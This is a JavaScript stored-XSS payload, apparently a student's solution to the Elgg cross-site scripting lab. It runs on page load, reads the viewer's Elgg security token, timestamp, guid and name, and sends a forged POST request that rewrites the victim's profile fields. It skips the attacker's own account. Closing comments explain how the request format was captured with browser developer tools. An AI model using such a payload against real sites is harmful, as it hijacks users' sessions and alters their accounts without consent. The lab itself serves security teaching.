<script type="text/javascript">

// function myRand(length) 
// {
// var result           = '';
//    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
//    var charactersLength = characters.length;
//    for ( var i = 0; i < length; i++ ) {
//      result += characters.charAt(Math.floor(Math.random() * 
// charactersLength));
//   }
//   return result;
//}

//var interest = myRand(5);

	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="__elgg_token="+elgg.security.token.__elgg_token;
	var guid="&guid=" + elgg.session.user.guid;
	var name="&name=" + elgg.session.user.name; 


//Construct the content of your url.
	var brief_desc = "I am sorry to sniff into your acc.";
        var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
	var content=token + ts + name + "&description=1605071&accesslevel%5Bdescription%5D=1&briefdescription="+brief_desc+
"&accesslevel%5Bbriefdescription%5D=1&location=dhaka&accesslevel%5Blocation%5D=1&interests=violin&accesslevel%5Binterests%5D=1&skills=tension&accesslevel%5Bskills%5D=1&contactemail=random@gmail.com&accesslevel%5Bcontactemail%5D=1&phone=0000&accesslevel%5Bphone%5D=1&mobile=0000&accesslevel%5Bmobile%5D=1&website=random.com&accesslevel%5Bwebsite%5D=1&twitter=random_twitter&accesslevel%5Btwitter%5D=1" + guid; //FILL IN


if(elgg.session.user.guid != 47)
	{

		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
else 
{
console.log('this is samy');
}
	}
</script>


// ######################   initial state
// var accesslevel = 2;
// var brief_desc = "";
// var content=token + ts + name + 
// "&description=&accesslevel%5Bdescription%5D=" + accesslevel + 
// "&briefdescription=" + brief_desc + "&accesslevel%5Bbriefdescription%5D=" + accesslevel + 
// "&location=&accesslevel%5Blocation%5D=" + accesslevel + 
// "&interests=&accesslevel%5Binterests%5D=" + accesslevel + 
// "&skills=&accesslevel%5Bskills%5D=" + accesslevel + 
// "&contactemail=&accesslevel%5Bcontactemail%5D=" + accesslevel + "&phone=&accesslevel%5Bphone%5D=" + accesslevel + 
// "&mobile=&accesslevel%5Bmobile%5D=" + accesslevel + 
// "&website=&accesslevel%5Bwebsite%5D=" + accesslevel + 
// "&twitter=&accesslevel%5Btwitter%5D=" + accesslevel + guid; //FILL IN
// ###################### 


// went to alice's profile, clicked edit profile,
// opened inspect element, 
// went to network, 
// modified a field, saved it and got a POST request, clicked it 
// and found headers and request URL,
// found name in the same procedure as guid